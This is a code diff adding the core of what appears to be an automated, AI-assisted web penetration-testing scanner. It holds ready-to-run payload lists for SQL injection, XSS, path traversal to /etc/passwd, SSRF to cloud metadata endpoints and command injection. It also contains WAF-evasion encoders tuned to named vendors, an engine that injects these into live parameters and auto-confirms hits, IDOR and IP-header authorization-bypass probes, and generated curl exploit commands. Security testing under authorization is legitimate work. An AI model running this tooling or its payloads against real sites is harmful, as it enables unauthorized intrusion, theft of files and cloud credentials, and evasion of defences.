@@ -11177,6 +11177,866 @@ class PentestPipeline:
 # ─────────────────────────────────────────────────────────────────────────────
 # ENTRY POINT
 # ─────────────────────────────────────────────────────────────────────────────
+normalize_url_template = _normalize_url_template
+import random
+
+
+def _scancontext_update_tech(self, partial: dict):
+    with self.lock:
+        for key, value in (partial or {}).items():
+            if value and value != "unknown":
+                self.site_tech[key] = value
+
+
+def _scancontext_add_findings(self, findings: List[Finding]):
+    if not findings:
+        return
+    with self.lock:
+        self.findings.extend(findings)
+
+
+if not hasattr(ScanContext, "update_tech"):
+    ScanContext.update_tech = _scancontext_update_tech
+if not hasattr(ScanContext, "add_findings"):
+    ScanContext.add_findings = _scancontext_add_findings
+
+
+_RESPONSE_LIMITS: dict = {
+    "application/json": 2_000_000,
+    "text/plain": 1_000_000,
+    "text/html": 512_000,
+    "application/xml": 512_000,
+    "text/xml": 512_000,
+    "application/javascript": 4_000_000,
+    "default": 512_000,
+}
+MAX_REDIRECTS = 10
+
+
+def _response_limit(content_type: str) -> int:
+    ct = (content_type or "").split(";", 1)[0].strip().lower()
+    for key, limit in _RESPONSE_LIMITS.items():
+        if key in ct:
+            return limit
+    return _RESPONSE_LIMITS["default"]
+
+
+class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
+    def __init__(self):
+        self.redirect_count = 0
+        self.redirect_chain: list = []
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        self.redirect_count += 1
+        self.redirect_chain.append(newurl)
+        if self.redirect_count > MAX_REDIRECTS:
+            raise urllib.error.URLError(f"Too many redirects (>{MAX_REDIRECTS}): {newurl}")
+        if newurl in self.redirect_chain[:-1]:
+            raise urllib.error.URLError(f"Redirect cycle detected: {newurl}")
+        return super().redirect_request(req, fp, code, msg, headers, newurl)
+
+
+class HTTPClient:
+    def __init__(self, session: SessionContext, timeout: int = DEFAULT_TIMEOUT):
+        self.session = session
+        self.timeout = timeout
+        self._ctx = ssl.create_default_context()
+        self._ctx.check_hostname = False
+        self._ctx.verify_mode = ssl.CERT_NONE
+        self._jar = http.cookiejar.CookieJar()
+        self._lock = threading.Lock()
+        self._rate_delay: float = 0.0
+        self._429_count: int = 0
+
+    def _build_opener(self) -> urllib.request.OpenerDirector:
+        return urllib.request.build_opener(
+            urllib.request.HTTPSHandler(context=self._ctx),
+            urllib.request.HTTPCookieProcessor(self._jar),
+            _NoRedirectHandler(),
+        )
+
+    def _build_headers(self, extra: Optional[dict] = None) -> dict:
+        headers = {
+            "User-Agent": DEFAULT_UA,
+            "Accept": "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+        }
+        with self._lock:
+            if self.session.cookies:
+                headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session.cookies.items())
+            if self.session.jwt_token:
+                headers["Authorization"] = f"Bearer {self.session.jwt_token}"
+            if self.session.csrf_token:
+                headers["X-CSRFToken"] = self.session.csrf_token
+            if self.session.headers:
+                headers.update(self.session.headers)
+        if extra:
+            headers.update(extra)
+        return headers
+
+    def get(self, url: str, extra_headers: Optional[dict] = None) -> dict:
+        return self._request(url, "GET", headers=extra_headers)
+
+    def post(self, url: str, data: Any = None,
+             json_data: Optional[dict] = None,
+             extra_headers: Optional[dict] = None) -> dict:
+        body, content_type = b"", "application/x-www-form-urlencoded"
+        if json_data is not None:
+            body = json.dumps(json_data).encode()
+            content_type = "application/json"
+        elif isinstance(data, dict):
+            body = urllib.parse.urlencode(data).encode()
+        elif isinstance(data, (str, bytes)):
+            body = data.encode() if isinstance(data, str) else data
+        headers = {"Content-Type": content_type}
+        if extra_headers:
+            headers.update(extra_headers)
+        return self._request(url, "POST", body=body, headers=headers)
+
+    def _request(self, url: str, method: str,
+                 body: Optional[bytes] = None,
+                 headers: Optional[dict] = None) -> dict:
+        if self._rate_delay > 0:
+            time.sleep(self._rate_delay)
+        req = urllib.request.Request(
+            url, data=body, headers=self._build_headers(headers), method=method
+        )
+        t0 = time.time()
+        try:
+            opener = self._build_opener()
+            with opener.open(req, timeout=self.timeout) as resp:
+                ct = resp.headers.get("Content-Type", "")
+                raw = resp.read(_response_limit(ct))
+                timing = time.time() - t0
+                decoded = raw.decode("utf-8", errors="replace")
+                resp_headers = dict(resp.headers)
+                with self._lock:
+                    for cookie in self._jar:
+                        self.session.cookies[cookie.name] = cookie.value
+                self._429_count = 0
+                if self._rate_delay > 0:
+                    self._rate_delay = max(0.0, self._rate_delay * 0.5)
+                    if self._rate_delay < 0.5:
+                        self._rate_delay = 0.0
+                return {
+                    "ok": True, "status": resp.status, "url": resp.url,
+                    "headers": resp_headers, "body": decoded,
+                    "timing": round(timing, 3), "error": None,
+                }
+        except urllib.error.HTTPError as exc:
+            timing = time.time() - t0
+            resp_body = ""
+            try:
+                ct = exc.headers.get("Content-Type", "") if exc.headers else ""
+                resp_body = exc.read(_response_limit(ct)).decode("utf-8", errors="replace")
+            except Exception:
+                pass
+            if exc.code == 429:
+                self._429_count += 1
+                delay = min(2 ** self._429_count, 8.0)
+                self._rate_delay = max(self._rate_delay, delay)
+                time.sleep(delay)
+            return {
+                "ok": False, "status": exc.code, "url": url,
+                "headers": dict(exc.headers) if exc.headers else {},
+                "body": resp_body, "timing": round(timing, 3), "error": str(exc),
+            }
+        except Exception as exc:
+            return {
+                "ok": False, "status": 0, "url": url,
+                "headers": {}, "body": "", "timing": 0.0, "error": str(exc),
+            }
+
+
+class PayloadMutator:
+    def __init__(self, waf_name: str = ""):
+        self.waf = (waf_name or "").lower()
+
+    def mutate(self, payload: str, max_variants: int = 20) -> List[str]:
+        seen = set()
+        variants: List[str] = []
+
+        def add(item: str):
+            if item and item not in seen:
+                seen.add(item)
+                variants.append(item)
+
+        add(payload)
+        for fn in (self._url_encode, self._double_url_encode, self._html_entity, self._unicode_escape, self._mixed_case):
+            add(fn(payload))
+        if "cloudflare" in self.waf:
+            tamper_fns = (self._space2comment, self._charencode, self._charunicodeencode)
+        elif "modsecurity" in self.waf or "mod_security" in self.waf:
+            tamper_fns = (self._between, self._lowercase, self._space2dash)
+        elif "aws" in self.waf:
+            tamper_fns = (self._randomcase, self._percentage, self._space2plus)
+        elif "f5" in self.waf or "big-ip" in self.waf:
+            tamper_fns = (self._versionedkeywords, self._space2comment)
+        else:
+            tamper_fns = (self._space2comment, self._between, self._lowercase, self._randomcase, self._space2plus, self._space2dash, self._percentage, self._charencode)
+        for fn in tamper_fns:
+            add(fn(payload))
+        return variants[:max_variants]
+
+    @staticmethod
+    def _url_encode(payload: str) -> str:
+        return urllib.parse.quote(payload, safe="")
+
+    @staticmethod
+    def _double_url_encode(payload: str) -> str:
+        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
+
+    @staticmethod
+    def _html_entity(payload: str) -> str:
+        return "".join(f"&#{ord(ch)};" if ord(ch) > 127 or ch in "<>\"'&" else ch for ch in payload)
+
+    @staticmethod
+    def _unicode_escape(payload: str) -> str:
+        return "".join(f"\\u{ord(ch):04x}" if ch in "'\"<>&=;" else ch for ch in payload)
+
+    @staticmethod
+    def _mixed_case(payload: str) -> str:
+        result = payload
+        for kw in ("SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "FROM", "WHERE", "AND", "OR", "NULL", "SLEEP", "WAITFOR"):
+            result = re.sub(re.escape(kw), lambda m: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(m.group())), result, flags=re.IGNORECASE)
+        return result
+
+    @staticmethod
+    def _space2comment(payload: str) -> str:
+        return payload.replace(" ", "/**/")
+
+    @staticmethod
+    def _space2plus(payload: str) -> str:
+        return payload.replace(" ", "+")
+
+    @staticmethod
+    def _space2dash(payload: str) -> str:
+        return payload.replace(" ", "--\n")
+
+    @staticmethod
+    def _between(payload: str) -> str:
+        return re.sub(r"(\w+)\s*=\s*(\d+)", lambda m: f"{m.group(1)} BETWEEN {m.group(2)} AND {int(m.group(2)) + 1}", payload)
+
+    @staticmethod
+    def _lowercase(payload: str) -> str:
+        return payload.lower()
+
+    @staticmethod
+    def _randomcase(payload: str) -> str:
+        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
+
+    @staticmethod
+    def _percentage(payload: str) -> str:
+        result = payload
+        for kw in ("SELECT", "UNION", "WHERE", "FROM", "AND", "OR"):
+            result = re.sub(re.escape(kw), "%".join(kw), result, flags=re.IGNORECASE)
+        return result
+
+    @staticmethod
+    def _charencode(payload: str) -> str:
+        return payload.replace("'", "CHAR(39)")
+
+    @staticmethod
+    def _charunicodeencode(payload: str) -> str:
+        return "".join(f"NCHAR({ord(ch)})" if ch in "'\"" else ch for ch in payload)
+
+    @staticmethod
+    def _versionedkeywords(payload: str) -> str:
+        result = payload
+        for kw in ("SELECT", "UNION", "FROM", "WHERE"):
+            result = re.sub(re.escape(kw), f"/*!{kw}*/", result, flags=re.IGNORECASE)
+        return result
+
+
+BASE_PAYLOADS: dict = {
+    "sqli": ["'", "''", "1'--", "1 OR 1=1--", "' OR '1'='1", "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--", "' UNION SELECT NULL,NULL,NULL--", "1 AND 1=2", "'; WAITFOR DELAY '0:0:3'--", "admin'--", "1' AND 1=1--", "' OR 1=1#"],
+    "xss": ["<script>alert(1)</script>", '"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(1)</script>"],
+    "lfi": ["../../../../etc/passwd", "../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../../windows/win.ini", "/etc/passwd", "file:///etc/passwd"],
+    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "{{self.__dict__}}", "{% debug %}", "{{request.environ}}"],
+    "ssrf": ["http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/", "http://0x7f000001/", "http://2130706433/", "http://127.1/", "http://[::1]/", "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:9200/_cat/indices", "file:///etc/passwd"],
+    "cmdi": ["; id", "| id", "$(id)", "; sleep 5", "| sleep 5", "$(sleep 5)", "; cat /etc/passwd", "| cat /etc/passwd", "|| id", "; whoami", "\nid\n", "`id`"],
+}
+
+
+def get_payloads(vuln_type: str, waf_name: str = "", max_variants: int = 20, base_only: bool = False) -> List[str]:
+    base = list(BASE_PAYLOADS.get(vuln_type, ["'", '"', "<script>alert(1)</script>", "{{7*7}}", "../../../../etc/passwd", "; id", "1 OR 1=1"]))
+    if base_only or not base:
+        return base
+    mutator = PayloadMutator(waf_name=waf_name)
+    merged: List[str] = []
+    seen = set()
+    for payload in base:
+        for variant in mutator.mutate(payload, max_variants=5):
+            if variant not in seen:
+                seen.add(variant)
+                merged.append(variant)
+        if len(merged) >= max_variants:
+            break
+    return merged[:max_variants]
+
+
+EVIDENCE_SCORES: Dict[str, int] = {
+    "sql_error_with_table": 90,
+    "rce_output": 90,
+    "file_content": 88,
+    "aws_metadata": 92,
+    "sql_version": 88,
+    "xss_reflected": 85,
+    "ssti_computed": 88,
+    "ssrf_internal_resp": 85,
+    "time_blind": 60,
+    "size_diff_large": 40,
+    "status_change": 35,
+    "new_error_generic": 30,
+}
+
+
+def score_evidence(evidence_tags: List[str]) -> int:
+    if not evidence_tags:
+        return 0
+    scores = sorted([EVIDENCE_SCORES.get(tag, 20) for tag in evidence_tags], reverse=True)
+    return min(100, int(scores[0] + sum(s * 0.1 for s in scores[1:])))
+
+
+SQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
+    (r"sql syntax.*near", "sql_error_with_table"),
+    (r"ORA-\d{4,5}", "sql_error_with_table"),
+    (r"pg::\w+error", "sql_error_with_table"),
+    (r"mysql_fetch\w+\(\)", "sql_error_with_table"),
+    (r"microsoft.*sql.*server.*error", "sql_error_with_table"),
+    (r"jdbc\.\w+exception", "sql_error_with_table"),
+    (r"unclosed quotation mark", "sql_error_with_table"),
+    (r"unterminated string literal", "sql_error_with_table"),
+    (r"invalid column name", "sql_error_with_table"),
+    (r"table or view not found", "sql_error_with_table"),
+    (r"database error", "new_error_generic"),
+    (r"query failed", "new_error_generic"),
+]
+LFI_PATTERNS: List[Tuple[str, str]] = [
+    (r"root:x:0:0:", "file_content"),
+    (r"\[extensions\]", "file_content"),
+    (r"daemon:x:\d+:\d+:", "file_content"),
+    (r"win\.ini.*\[fonts\]", "file_content"),
+]
+RCE_PATTERNS: List[Tuple[str, str]] = [
+    (r"uid=\d+\(\w+\)\s+gid=\d+", "rce_output"),
+    (r"root\s+\d+\s+\d+\.\d+", "rce_output"),
+    (r"total \d+\ndrwx", "rce_output"),
+]
+SSRF_PATTERNS: List[Tuple[str, str]] = [
+    (r"ami-id.*instance-id", "aws_metadata"),
+    (r"iam/security-credentials", "aws_metadata"),
+    (r"computeMetadata/v1", "aws_metadata"),
+    (r"\+PONG", "ssrf_internal_resp"),
+    (r"redis_version", "ssrf_internal_resp"),
+]
+XSS_MARKERS = ["<script>alert(", "<img src=x onerror=", "<svg onload="]
+
+
+class SemanticResponseDiff:
+    def diff(self, baseline: BaselineFingerprint, fuzz_resp: dict,
+             payload: str, vuln_type: str = "", timing: float = 0.0) -> dict:
+        body = fuzz_resp.get("body", "")
+        status = fuzz_resp.get("status", 0)
+        body_lower = body.lower()
+        evidence_tags: List[str] = []
+        evidence_text: List[str] = []
+        if status != baseline.status:
+            evidence_tags.append("status_change")
+            evidence_text.append(f"Status: {baseline.status} -> {status}")
+        timing_diff = timing - baseline.timing_avg
+        if timing > 3.0 and timing_diff > 2.5 and baseline.timing_avg < 1.5:
+            evidence_tags.append("time_blind")
+            evidence_text.append(f"Time delay: baseline={baseline.timing_avg:.2f}s fuzz={timing:.2f}s diff={timing_diff:.2f}s")
+        for pattern, tag in SQL_ERROR_PATTERNS:
+            match = re.search(pattern, body_lower)
+            if match:
+                evidence_tags.append(tag)
+                evidence_text.append(f"SQL indicator: {match.group()[:80]}")
+                break
+        for pattern, tag in LFI_PATTERNS:
+            match = re.search(pattern, body_lower)
+            if match:
+                evidence_tags.append(tag)
+                evidence_text.append(f"File content: {match.group()[:80]}")
+                break
+        for pattern, tag in RCE_PATTERNS:
+            match = re.search(pattern, body)
+            if match:
+                evidence_tags.append(tag)
+                evidence_text.append(f"RCE output: {match.group()[:80]}")
+                break
+        for pattern, tag in SSRF_PATTERNS:
+            match = re.search(pattern, body, re.IGNORECASE)
+            if match:
+                evidence_tags.append(tag)
+                evidence_text.append(f"SSRF indicator: {match.group()[:80]}")
+                break
+        if payload and any(marker in body for marker in XSS_MARKERS) and payload[:20] in body:
+            evidence_tags.append("xss_reflected")
+            evidence_text.append(f"XSS payload reflected: {payload[:40]}")
+        if vuln_type == "ssti" and "49" in body and "7*7" in (payload or ""):
+            evidence_tags.append("ssti_computed")
+            evidence_text.append("SSTI: 7*7=49 computed in response")
+        size_diff = len(body) - baseline.body_len
+        size_pct = abs(size_diff) / max(baseline.body_len, 1) * 100
+        if size_pct > 40 and abs(size_diff) > 300:
+            evidence_tags.append("size_diff_large")
+            evidence_text.append(f"Size diff: {size_diff:+d} bytes ({size_pct:.1f}%)")
+        confidence = score_evidence(evidence_tags)
+        return {
+            "evidence_tags": evidence_tags,
+            "evidence_text": evidence_text,
+            "confidence": confidence,
+            "status_changed": status != baseline.status,
+            "time_anomaly": "time_blind" in evidence_tags,
+            "size_diff": size_diff,
+            "size_pct": round(size_pct, 1),
+            "is_interesting": confidence >= 30 or bool(evidence_tags),
+            "body_snippet": body[:600],
+        }
+
+
+class ResponseClassifier:
+    _STATIC_EXTENSIONS = {
+        ".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif",
+        ".webp", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".avif",
+    }
+    _STATIC_PATH_MARKERS = (
+        "/_next/static/", "/_next/image", "/static/", "/assets/", "/favicon",
+        "/images/", "/image/", "/img/", "/fonts/", "/css/", "/js/", "/dist/", "/build/",
+    )
+
+    @classmethod
+    def normalize_content_type(cls, headers: Optional[dict]) -> str:
+        headers = headers or {}
+        ct = headers.get("content-type", headers.get("Content-Type", "")) or ""
+        return str(ct).split(";", 1)[0].strip().lower()
+
+    @classmethod
+    def is_static_asset_url(cls, url: str) -> bool:
+        path = urllib.parse.urlparse(str(url or "")).path.lower()
+        if not path:
+            return False
+        if any(marker in path for marker in cls._STATIC_PATH_MARKERS):
+            return True
+        return any(path.endswith(ext) for ext in cls._STATIC_EXTENSIONS)
+
+    @classmethod
+    def classify(cls, url: str, headers: Optional[dict] = None, body: str = "", status: int = 0) -> dict:
+        ct = cls.normalize_content_type(headers)
+        body_lower = str(body or "")[:4000].lower()
+        verdict = "unknown"
+        reason = "No strong classification signal."
+        if cls.is_static_asset_url(url) or ct.startswith(("image/", "font/", "audio/", "video/")):
+            verdict = "static_asset"
+            reason = "Static URL pattern or content type."
+        elif status in (401, 403):
+            verdict = "protected_content"
+            reason = "Explicit authorization status."
+        elif "text/html" in ct or "<html" in body_lower or "<body" in body_lower:
+            login_score = sum(1 for marker in ['type="password"', "sign in", "login", "log in", "forgot password"] if marker in body_lower)
+            if login_score >= 2:
+                verdict = "login_page"
+                reason = "HTML contains login form markers."
+            else:
+                public_score = sum(1 for marker in ["<nav", "<footer", "copyright", "contact", "__next", "_next/static"] if marker in body_lower)
+                verdict = "public_page" if public_score >= 1 else "unknown"
+                reason = "HTML looks public." if verdict == "public_page" else reason
+        elif "json" in ct or str(body).lstrip().startswith(("{", "[")):
+            verdict = "data_response"
+            reason = "Structured JSON/API response."
+        title_match = re.search(r"<title[^>]*>(.*?)</title>", str(body or ""), re.I | re.S)
+        title = title_match.group(1).strip()[:120] if title_match else ""
+        return {
+            "verdict": verdict,
+            "reason": reason,
+            "content_type": ct or "unknown",
+            "status": int(status or 0),
+            "title": title,
+            "url": url,
+        }
+
+
+class AgenticFuzzEngine:
+    _MANDATORY_INJECTION_PARAMS = {
+        "q", "query", "search", "keyword", "keywords", "term", "terms",
+        "filter", "find", "lookup", "s", "k", "w", "text",
+        "id", "user_id", "uid", "account_id", "product_id", "item_id",
+        "post_id", "comment_id", "order_id", "name", "username", "email",
+        "input", "data", "value", "content", "message", "comment", "title",
+        "slug", "body", "file", "path", "page", "include", "load", "template",
+        "doc", "url", "redirect", "next", "src", "href", "dest", "target",
+        "cmd", "exec", "command", "ping", "host", "ip",
+    }
+
+    def __init__(self, client: HTTPClient, baseline: Any = None,
+                 kali: Any = None, ai: Any = None, ctx: Optional[ScanContext] = None,
+                 oob: Any = None, waf_name: str = ""):
+        self.client = client
+        self.baseline = baseline
+        self.kali = kali
+        self.ai = ai
+        self.ctx = ctx or ScanContext()
+        self.oob = oob
+        self.waf_name = waf_name or getattr(kali, "_waf_detected", "") or ""
+        self._differ = SemanticResponseDiff()
+        self._last_resp: dict = {}
+
+    def test_endpoint(self, ep: Endpoint) -> List[Finding]:
+        local_findings: List[Finding] = []
+        base_fp = self._get_baseline(ep)
+        if base_fp.status in (401, 403):
+            local_findings.extend(self._test_auth_bypass(ep, base_fp))
+        local_findings.extend(self._mandatory_injections(ep, base_fp))
+        local_findings.extend(self._test_idor_all(ep, base_fp))
+        local_findings.extend(self._test_security_headers(ep, base_fp))
+        return local_findings
+
+    def _get_baseline(self, ep: Endpoint) -> BaselineFingerprint:
+        if self.baseline and hasattr(self.baseline, "get"):
+            try:
+                return self.baseline.get(ep)
+            except Exception:
+                pass
+        resp = self.client.get(ep.url) if ep.method == "GET" else self.client.post(ep.url, data=ep.params)
+        if resp["status"] == 0:
+            return BaselineFingerprint(0, 0, "", "", 0, "", 0, [])
+        body = resp["body"]
+        return BaselineFingerprint(
+            status=resp["status"],
+            body_len=len(body),
+            body_hash=hashlib.md5(body.encode()).hexdigest(),
+            title=self._extract_title(body),
+            timing_avg=resp["timing"],
+            headers_sig="",
+            word_count=len(body.split()),
+            error_strings=self._extract_errors(body),
+        )
+
+    def _mandatory_injections(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
+        findings: List[Finding] = []
+        for param_key, _param_val in list(ep.params.items()):
+            pname = param_key.split(":")[-1].lower()
+            if param_key.startswith(("header:", "cookie:")) or pname not in self._MANDATORY_INJECTION_PARAMS:
+                continue
+            vuln_types = ["sqli", "xss", "ssti"]
+            if pname in {"file", "path", "page", "include", "load", "template", "doc"}:
+                vuln_types.append("lfi")
+            if pname in {"url", "redirect", "next", "src", "href", "dest", "target"}:
+                vuln_types.append("ssrf")
+            if pname in {"cmd", "exec", "command", "ping", "host", "ip"}:
+                vuln_types.append("cmdi")
+            for vuln_type in vuln_types:
+                findings.extend(self._test_injection(vuln_type, param_key, ep, base_fp))
+        return findings
+
+    def _test_injection(self, vuln_type: str, param: str, ep: Endpoint,
+                        base_fp: BaselineFingerprint) -> List[Finding]:
+        payloads = self._get_payloads(vuln_type, ep)
+        best_diff: dict = {}
+        best_resp: dict = {}
+        best_payload = ""
+        for payload in payloads[:12]:
+            if self.ctx.already_tested(ep.url, ep.method, param, payload):
+                continue
+            resp = self._fuzz_request(ep, param, payload)
+            diff = self._differ.diff(base_fp, resp, payload, vuln_type, resp.get("timing", 0))
+            self._last_resp = resp
+            if diff["is_interesting"] and diff["confidence"] > best_diff.get("confidence", 0):
+                best_diff = diff
+                best_resp = resp
+                best_payload = payload
+                if diff["confidence"] >= 85:
+                    break
+        if not best_diff or not best_diff.get("is_interesting"):
+            return []
+        confirmed, confirm_evidence = self._auto_confirm(vuln_type, param, best_payload, ep)
+        if confirm_evidence:
+            best_diff["evidence_tags"].extend(confirm_evidence)
+            best_diff["confidence"] = score_evidence(best_diff["evidence_tags"])
+        confidence = best_diff["confidence"]
+        if confidence < MIN_CONFIDENCE:
+            return []
+        finding = Finding(
+            owasp_id=self._owasp_id(vuln_type),
+            owasp_name=self._owasp_name(vuln_type),
+            title=f"{vuln_type.upper()} in {param.split(':')[-1]}: {ep.url}",
+            risk=self._risk(vuln_type, confidence),
+            confidence=confidence,
+            url=ep.url,
+            method=ep.method,
+            param=param,
+            payload=best_payload,
+            evidence="; ".join(best_diff.get("evidence_text", []))[:400],
+            baseline_diff=json.dumps(best_diff, default=str)[:300],
+            tool_output=best_resp.get("body", "")[:500],
+            request_raw=self._build_req(ep, param, best_payload),
+            response_raw=best_resp.get("body", "")[:600],
+            exploit_cmd=self._build_exploit(vuln_type, ep, param, best_payload),
+            remediation=self._remediation(vuln_type),
+            confirmed=confirmed,
+            tool=vuln_type,
+        )
+        self._print_finding(finding)
+        return [finding]
+
+    def _auto_confirm(self, vuln_type: str, param: str, payload: str, ep: Endpoint) -> tuple:
+        extra: list = []
+        if vuln_type == "sqli":
+            for test in ("' UNION SELECT version(),NULL--", "' UNION SELECT @@version,NULL--", "1 UNION SELECT version()--"):
+                if self.ctx.already_tested(ep.url, ep.method, param, test):
+                    continue
+                body = self._fuzz_request(ep, param, test).get("body", "")
+                if re.search(r"\d+\.\d+\.\d+-", body) or "postgresql" in body.lower():
+                    extra.append("sql_version")
+                    return True, extra
+        elif vuln_type == "xss":
+            marker = f"XSSCHECK{hashlib.md5(payload.encode()).hexdigest()[:6]}"
+            body = self._fuzz_request(ep, param, f'\"><img src=x onerror=alert("{marker}")>').get("body", "")
+            if marker in body:
+                extra.append("xss_reflected")
+                return True, extra
+        elif vuln_type == "lfi":
+            for test in ("../../../../etc/passwd", "../../../../windows/win.ini"):
+                body = self._fuzz_request(ep, param, test).get("body", "")
+                if "root:x:0:0:" in body or "[extensions]" in body:
+                    extra.append("file_content")
+                    return True, extra
+        elif vuln_type == "cmdi":
+            marker = f"CMDCHECK{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
+            for test in (f"; echo {marker}", f"| echo {marker}", f"$(echo {marker})"):
+                if marker in self._fuzz_request(ep, param, test).get("body", ""):
+                    extra.append("rce_output")
+                    return True, extra
+        elif vuln_type == "ssrf":
+            body = self._fuzz_request(ep, param, "http://169.254.169.254/latest/meta-data/").get("body", "").lower()
+            if "ami-id" in body or "instance-id" in body:
+                extra.append("aws_metadata")
+                return True, extra
+        return False, extra
+
+    def _test_idor_all(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
+        findings: List[Finding] = []
+        path = urllib.parse.urlparse(ep.url).path
+        id_params: List[tuple] = []
+        for key, value in ep.params.items():
+            pname = key.split(":")[-1].lower()
+            if pname in {"id", "uid", "user_id", "account_id", "item_id", "post_id", "order_id", "comment_id", "product_id", "ticket_id"}:
+                id_params.append((key, str(value), "param"))
+        for match in re.finditer(r"/(\d{1,12})(?=/|$|\?)", path):
+            id_params.append((f"path_id:{match.group(1)}", match.group(1), "path"))
+        for param_key, original, id_type in id_params:
+            for test_value in self._generate_idor_ids(original, id_type):
+                if test_value == original or self.ctx.already_tested(ep.url, "GET", param_key, test_value):
+                    continue
+                resp = self.client.get(ep.url.replace(f"/{original}", f"/{test_value}", 1)) if id_type == "path" else self._fuzz_request(ep, param_key, test_value)
+                diff = self._differ.diff(base_fp, resp, test_value, "idor", resp.get("timing", 0))
+                self._last_resp = resp
+                if diff.get("confidence", 0) >= MIN_CONFIDENCE:
+                    findings.append(Finding(
+                        owasp_id="A01",
+                        owasp_name="Broken Access Control",
+                        title=f"IDOR: {param_key} {original}->{test_value}: {ep.url}",
+                        risk="High",
+                        confidence=diff["confidence"],
+                        url=ep.url,
+                        method="GET",
+                        param=param_key,
+                        payload=test_value,
+                        evidence="; ".join(diff.get("evidence_text", []))[:300],
+                        baseline_diff=f"{original}->{test_value}",
+                        tool_output=resp.get("body", "")[:400],
+                        request_raw=f"GET {ep.url} ({param_key}={test_value})",
+                        response_raw=resp.get("body", "")[:400],
+                        exploit_cmd=f"curl '{ep.url}?{param_key.split(':')[-1]}={test_value}'",
+                        remediation="Verify object ownership before returning data.",
+                        tool="idor",
+                    ))
+                    break
+        return findings
+
+    @staticmethod
+    def _generate_idor_ids(original: str, id_type: str) -> List[str]:
+        if id_type in ("path", "param") and re.fullmatch(r"\d+", original):
+            number = int(original)
+            return [str(number + 1), str(number - 1), str(number + 2), "0", "1", "2", "999999", str(number + 100)]
+        return ["1", "2", "0", "admin", "null", "-1"]
+
+    def _test_auth_bypass(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
+        findings: List[Finding] = []
+        path = urllib.parse.urlparse(ep.url).path
+        baseline_body = self.client.get(ep.url).get("body", "")
+        baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()
+
+        def is_real_bypass(resp: dict) -> tuple:
+            if resp.get("status") not in (200, 201, 202, 206):
+                return False, 0, ""
+            body = resp.get("body", "")
+            if len(body) < 50 or hashlib.md5(body.encode()).hexdigest() == baseline_hash:
+                return False, 0, ""
+            body_lower = body.lower()
+            login_sigs = sum(1 for s in ("password", "login", "sign in", "username") if s in body_lower)
+            if login_sigs >= 2:
+                return False, 0, ""
+            return True, 82, f"Status {base_fp.status}->{resp['status']}, body {len(baseline_body)}->{len(body)}"
+
+        for header, value in {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Custom-IP-Authorization": "127.0.0.1",
+            "X-Forwarded-Host": "localhost",
+            "Client-IP": "127.0.0.1",
+        }.items():
+            ok, conf, evidence = is_real_bypass(self.client.get(ep.url, extra_headers={header: value}))
+            if ok:
+                findings.append(self._bypass_finding(
+                    title=f"IP Header Bypass via {header}: {path}",
+                    url=ep.url, param=f"header:{header}", payload=value,
+                    evidence=evidence, confirmed=True,
+                    exploit=f"curl -H '{header}: {value}' '{ep.url}'", conf=conf,
+                ))
+        return findings
+
+    @staticmethod
+    def _bypass_finding(title, url, param, payload, evidence, confirmed, exploit, conf) -> Finding:
+        return Finding(
+            owasp_id="A01", owasp_name="Broken Access Control",
+            title=title, risk="High", confidence=conf, url=url, method="GET",
+            param=param, payload=payload, evidence=evidence, baseline_diff="403->200",
+            tool_output="", request_raw=f"GET {url}", response_raw="", exploit_cmd=exploit,
+            remediation="Enforce authorization at every path level.",
+            confirmed=confirmed, tool="auth_bypass",
+        )
+
+    def _test_security_headers(self, ep: Endpoint, base_fp: Optional[BaselineFingerprint] = None) -> List[Finding]:
+        resp = self.client.get(ep.url)
+        headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
+        missing = []
+        for header, desc in {
+            "strict-transport-security": "HSTS missing",
+            "content-security-policy": "No CSP",
+            "x-frame-options": "Clickjacking possible",
+            "x-content-type-options": "MIME sniffing",
+        }.items():
+            if header not in headers:
+                missing.append(f"{header}: {desc}")
+        if headers.get("access-control-allow-origin", "") == "*":
+            missing.append("CORS wildcard")
+        if not missing:
+            return []
+        return [Finding(
+            owasp_id="A05", owasp_name="Security Misconfiguration",
+            title=f"Missing security headers ({len(missing)}): {ep.url}",
+            risk="Medium", confidence=90, url=ep.url, method="GET",
+            param="HTTP_HEADERS", payload="", evidence="; ".join(missing[:4]),
+            baseline_diff="", tool_output="", request_raw=f"GET {ep.url}",
+            response_raw="", exploit_cmd="", remediation="Add missing security headers.",
+            tool="header_check",
+        )]
+
+    def _get_payloads(self, vuln_type: str, ep: Endpoint) -> list:
+        if hasattr(self.ai, "generate_payloads"):
+            try:
+                generated = self.ai.generate_payloads(vuln_type, {"tech": self.ctx.site_tech, "url": ep.url, "param": ""})
+                if generated:
+                    mutator = PayloadMutator(self.waf_name)
+                    variants: List[str] = []
+                    for payload in generated[:5]:
+                        variants.extend(mutator.mutate(payload, max_variants=4))
+                    return list(dict.fromkeys(variants))[:20]
+            except Exception:
+                pass
+        return get_payloads(vuln_type, waf_name=self.waf_name, max_variants=20)
+
